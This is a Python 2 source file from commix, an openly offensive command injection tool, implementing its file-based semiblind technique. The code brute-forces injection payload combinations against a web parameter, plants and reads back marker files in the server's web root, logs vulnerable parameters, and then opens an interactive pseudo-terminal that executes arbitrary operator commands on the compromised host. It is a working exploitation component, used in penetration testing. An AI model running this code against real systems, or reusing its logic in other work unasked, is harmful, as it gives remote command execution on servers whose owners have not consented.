#!/usr/bin/env python
# encoding: UTF-8

"""
 This file is part of commix (@commixproject) tool.
 Copyright (c) 2015 Anastasios Stasinopoulos (@ancst).
 https://github.com/stasinopoulos/commix

 This program is free software: you can redistribute it and/or modify
 it under the terms of the GNU General Public License as published by
 the Free Software Foundation, either version 3 of the License, or
 (at your option) any later version.
 
 For more see the file 'readme/COPYING' for copying permission.
"""

import re
import os
import sys
import time
import string
import random
import base64
import urllib
import urllib2

from src.utils import menu
from src.utils import colors
from src.utils import settings

from src.core.requests import headers
from src.core.requests import parameters

from src.core.injections.semiblind_based.techniques.file_based import fb_injector
from src.core.injections.semiblind_based.techniques.file_based import fb_payloads
from src.core.injections.semiblind_based.techniques.file_based import fb_enumeration
from src.core.injections.semiblind_based.techniques.file_based import fb_file_access
from src.core.injections.semiblind_based.techniques.tempfile_based import tfb_handler

"""
 The "file-based" technique on Semiblind-based OS Command Injection.
"""

# If temp-based technique failed, 
# use the "/tmp/" directory for tempfile-based technique.
def tfb_controller(no_result,url,delay,tmp_path,filename,http_request_method):
  if no_result == True:
    sys.stdout.write("(*) Trying to upload file, on temporary directory (" + tmp_path + ")...\n")
    tfb_handler.exploitation(url,delay,filename,tmp_path,http_request_method)     
  else :
    sys.stdout.write("\r")
    sys.stdout.flush()

# Delete previous shells outputs.
def delete_previous_shell(separator,payload,TAG,prefix,suffix,http_request_method,url,vuln_parameter,OUTPUT_TEXTFILE,alter_shell):
  cmd = "rm " + OUTPUT_TEXTFILE
  response = fb_injector.injection(separator,payload,TAG,cmd,prefix,suffix,http_request_method,url,vuln_parameter,OUTPUT_TEXTFILE,alter_shell=None)

#-----------------------------------------------
# The "file-based" injection technique handler
#-----------------------------------------------
def fb_injection_handler(url,delay,filename,http_request_method):

  counter = 0
  vp_flag = True
  exit_loops = False
  no_result = True
  is_encoded= False
  stop_injection = False
  call_tmp_based = False
  export_injection_info = False
  injection_type = "Semiblind-based Command Injection"
  technique = "file-based semiblind injection technique"
  
  if menu.options.tmp_path:
    tmp_path = menu.options.tmp_path
  else:
    tmp_path = settings.TMP_PATH
		  
  print "(*) Testing the "+ technique + "... "
    
  if menu.options.file_dest:
    if '/tmp/' in menu.options.file_dest:
      call_tmp_based = True
    SRV_ROOT_DIR = os.path.split(menu.options.file_dest)[0]
  else:
    if menu.options.srv_root_dir:
      SRV_ROOT_DIR = menu.options.srv_root_dir
    else:
      SRV_ROOT_DIR = settings.SRV_ROOT_DIR
  
  i = 0
  # Calculate all possible combinations
  total = len(settings.PREFIXES) * len(settings.SEPARATORS) * len(settings.SUFFIXES)

  # Check if defined alter shell
  alter_shell = menu.options.alter_shell
  
  for prefix in settings.PREFIXES:
    for suffix in settings.SUFFIXES:
      for separator in settings.SEPARATORS:
	i = i + 1
	
	# Change TAG on every request to prevent false-positive results.
	TAG = ''.join(random.choice(string.ascii_uppercase) for i in range(6)) 

	# Check if defined "--base64" option.
	if menu.options.base64_trick == True:
	  B64_ENC_TAG = base64.b64encode(TAG)
	  B64_DEC_TRICK = settings.B64_DEC_TRICK
	else:
	  B64_ENC_TAG = TAG
	  B64_DEC_TRICK = ""
	  
	# The output file for file-based injection technique.
	OUTPUT_TEXTFILE = B64_ENC_TAG + ".txt"
		    
	# Check for bad combination of prefix and separator
	combination = prefix + separator
	if combination in settings.JUNK_COMBINATION:
	  prefix = ""

	try:
	  
	  # File-based decision payload (check if host is vulnerable).
	  if alter_shell :
	    payload = fb_payloads.decision_alter_shell(separator,B64_ENC_TAG,B64_DEC_TRICK,OUTPUT_TEXTFILE)
	  else:
	    payload = fb_payloads.decision(separator,B64_ENC_TAG,B64_DEC_TRICK,OUTPUT_TEXTFILE)

		  
	  # Check if defined "--prefix" option.
	  if menu.options.prefix:
	    prefix = menu.options.prefix
	    payload = prefix + payload
	  else:
	    payload = prefix + payload
	    
	  # Check if defined "--suffix" option.
	  if menu.options.suffix:
	    suffix = menu.options.suffix
	    payload = payload + suffix
	  else:
	    payload = payload + suffix

	  # Check if defined "--verbose" option.
	  if menu.options.verbose:
	    sys.stdout.write("\n" + colors.GREY + payload.replace("\n","\\n") + colors.RESET)
	    
	  # Check if target host is vulnerable.
	  response,vuln_parameter = fb_injector.injection_test(payload,http_request_method,url)

	  # Find the directory.
	  path = url
	  path_parts = path.split('/')
	  count = 0
	  for part in path_parts:	
	    count = count + 1
	  count = count - 1
	  last_param = path_parts[count]
	  output = url.replace(last_param,OUTPUT_TEXTFILE)
	  time.sleep(delay)
	  
	  try:
	    # Check if defined extra headers.
	    request = urllib2.Request(output)
	    headers.do_check(request)
	    
	    # Evaluate test results.
	    output = urllib2.urlopen(request)
	    html_data = output.read()
	    shell = re.findall(r"" + TAG + "", html_data)
	    if len(shell) != 0 and not menu.options.verbose:
	      percent = colors.GREEN + "SUCCEED" + colors.RESET
	      sys.stdout.write("\r(*) Trying to upload the '"+ OUTPUT_TEXTFILE +"' on " + SRV_ROOT_DIR + "... [ " + percent + " ]")  
	      sys.stdout.flush()
	      
	  except urllib2.HTTPError, e:
	      if e.getcode() == 404:
		percent = ((i*100)/total)
		if call_tmp_based == True:
		  exit_loops = True
		  tmp_path = os.path.split(menu.options.file_dest)[0] + "/"
		  tfb_controller(no_result,url,delay,tmp_path,filename,http_request_method)
		  raise
		# Show an error message, after 20 failed tries.
		# Use the "/tmp/" directory for tempfile-based technique.
		elif i == 20 :
		  print "\n" + colors.BGRED + "(x) Error: It seems that you don't have permissions to write on "+ SRV_ROOT_DIR + "." + colors.RESET
		  while True:
		    tmp_upload = raw_input("(*) Do you want to try the temporary directory (" + tmp_path + ") [Y/n] > ").lower()
		    if tmp_upload in settings.CHOISE_YES:
		      exit_loops = True
		      tfb_controller(no_result,url,delay,tmp_path,filename,http_request_method)
		      if no_result == True:
			return False
		    elif tmp_upload in settings.CHOISE_NO:
		      break
		    else:
		      if tmp_upload == "":
			tmp_upload = "enter"
		      print colors.BGRED + "(x) Error: '" + tmp_upload + "' is not a valid answer." + colors.RESET
		      pass
		  continue
		
		else:
		  if exit_loops == False:
		    if not menu.options.verbose:
		      if percent == 100:
			if no_result == True:
			  percent = colors.RED + "FAILED" + colors.RESET
			else:
			  percent = str(percent)+"%"
		      else:
			percent = str(percent)+"%"
		      sys.stdout.write("\r(*) Trying to upload the '"+ OUTPUT_TEXTFILE +"' on " + SRV_ROOT_DIR + "... [ " + percent + " ]")  
		      sys.stdout.flush()
		      continue
		    else:
		      continue
		  else:
		    raise
		
	      elif e.getcode() == 401:
		print colors.BGRED + "(x) Error: Authorization required!" + colors.RESET + "\n"
		sys.exit(0)
		
	      elif e.getcode() == 403:
		print colors.BGRED + "(x) Error: You don't have permission to access this page." + colors.RESET + "\n"
		sys.exit(0)
	  
	except KeyboardInterrupt:
	  delete_previous_shell(separator,payload,TAG,prefix,suffix,http_request_method,url,vuln_parameter,OUTPUT_TEXTFILE,alter_shell)
	  raise
	
	except urllib2.URLError, e:
	  #print "\n" + colors.BGRED + "(x) Error: " + str(e.reason) + colors.RESET
	  sys.exit(0)
	
	except:
	  continue
	  
	# Yaw, got shellz! 
	# Do some magic tricks!
	if shell:
	  found = True
	  no_result = False
	  
	  # Print the findings to log file.
	  if export_injection_info == False:
	    output_file = open(filename + ".txt", "a")
	    output_file.write("\n(+) Type : " + injection_type)
	    output_file.write("\n(+) Technique : " + technique.title())
	    output_file.close()
	    export_injection_info = True
  
	  if http_request_method == "GET":
	    # Print the findings to log file
	    if vp_flag == True:
	      output_file = open(filename + ".txt", "a")
	      output_file.write("\n(+) Parameter : " + vuln_parameter + " (" + http_request_method + ")")
	      output_file.write("\n")
	      vp_flag = False
	      output_file.close()
	      
	    counter = counter + 1
	    output_file = open(filename + ".txt", "a")
	    output_file.write("  ("+str(counter)+") Payload : "+ re.sub("%20", " ", payload) + "\n")
	    output_file.close()
	    
	    #Vulnerable Parameter
	    GET_vuln_param = parameters.vuln_GET_param(url)
	      
	    # Print the findings to terminal.
	    print colors.BOLD + "\n(!) The ("+ http_request_method + ") '" + colors.UNDERL + GET_vuln_param + colors.RESET + colors.BOLD + "' parameter is vulnerable to "+ injection_type +"."+ colors.RESET
	    print "  (+) Type : "+ colors.YELLOW + colors.BOLD + injection_type + colors.RESET + ""
	    print "  (+) Technique : "+ colors.YELLOW + colors.BOLD + technique.title() + colors.RESET + ""
	    print "  (+) Payload : "+ colors.YELLOW + colors.BOLD + re.sub("%20", " ", payload.replace("\n","\\n")) + colors.RESET

	  else :
	    # Print the findings to log file
	    if vp_flag == True:
	      output_file = open(filename + ".txt", "a")
	      output_file.write("\n(+) Parameter : " + vuln_parameter + " (" + http_request_method + ")")
	      output_file.write("\n")
	      vp_flag = False
	      output_file.close()
	      
	    counter = counter + 1
	    output_file = open(filename + ".txt", "a")
	    output_file.write("  ("+str(counter)+") Payload : "+ re.sub("%20", " ", payload) + "\n")
	    output_file.close()
	    
	    #Vulnerable Parameter
	    POST_vuln_param = vuln_parameter
	    
	    # Print the findings to terminal.
	    print colors.BOLD + "\n(!) The ("+ http_request_method + ") '" + colors.UNDERL + POST_vuln_param + colors.RESET + colors.BOLD + "' parameter is vulnerable to "+ injection_type +"."+ colors.RESET
	    print "  (+) Type : "+ colors.YELLOW + colors.BOLD + injection_type + colors.RESET + ""
	    print "  (+) Technique : "+ colors.YELLOW + colors.BOLD + technique.title() + colors.RESET + ""
	    print "  (+) Payload : "+ colors.YELLOW + colors.BOLD + re.sub("%20", " ", payload.replace("\n","\\n")) + colors.RESET
	    
	  # Check for any enumeration options.
	  fb_enumeration.do_check(separator,payload,TAG,delay,prefix,suffix,http_request_method,url,vuln_parameter,OUTPUT_TEXTFILE,alter_shell)

	  # Check for any system file access options.
	  fb_file_access.do_check(separator,payload,TAG,delay,prefix,suffix,http_request_method,url,vuln_parameter,OUTPUT_TEXTFILE,alter_shell)
	  
	  try:
	    while True:
	      # Pseudo-Terminal shell
	      gotshell = raw_input("\n(*) Do you want a Pseudo-Terminal shell? [Y/n] > ").lower()
	      if gotshell in settings.CHOISE_YES:
		print ""
		print "Pseudo-Terminal (type 'q' or use <Ctrl-C> to quit)"
		while True:
		  cmd = raw_input("Shell > ")
		  if cmd == "q":
		    delete_previous_shell(separator,payload,TAG,prefix,suffix,http_request_method,url,vuln_parameter,OUTPUT_TEXTFILE,alter_shell)
		    sys.exit(0)
		    
		  else:
		    # The main command injection exploitation.
		    response = fb_injector.injection(separator,payload,TAG,cmd,prefix,suffix,http_request_method,url,vuln_parameter,OUTPUT_TEXTFILE,alter_shell)
		    print ""
		    # Command execution results.
		    shell = fb_injector.injection_results(url,OUTPUT_TEXTFILE,delay)
		    
		    if shell:
		      shell = " ".join(str(p) for p in shell)
		      print colors.GREEN + colors.BOLD + shell + colors.RESET + "\n"
		    
	      elif gotshell in settings.CHOISE_NO:
		delete_previous_shell(separator,payload,TAG,prefix,suffix,http_request_method,url,vuln_parameter,OUTPUT_TEXTFILE,alter_shell)
		if menu.options.verbose:
		  sys.stdout.write("\r\n(*) Continue testing the "+ technique +"... ")
		  sys.stdout.flush()
	        break
	      
	      else:
		if gotshell == "":
		  gotshell = "enter"
		print colors.BGRED + "(x) Error: '" + gotshell + "' is not a valid answer." + colors.RESET
		pass
	    
	  except KeyboardInterrupt: 
	    delete_previous_shell(separator,payload,TAG,prefix,suffix,http_request_method,url,vuln_parameter,OUTPUT_TEXTFILE,alter_shell)
	    print ""
	    sys.exit(0)
	    
  if no_result == True:
    if menu.options.verbose == False:
      print ""
      return False
    else:
      print ""
      return False
  else :
    sys.stdout.write("\r")
    sys.stdout.flush()
    
def exploitation(url,delay,filename,http_request_method):
    if fb_injection_handler(url,delay,filename,http_request_method) == False:
      return False

#eof
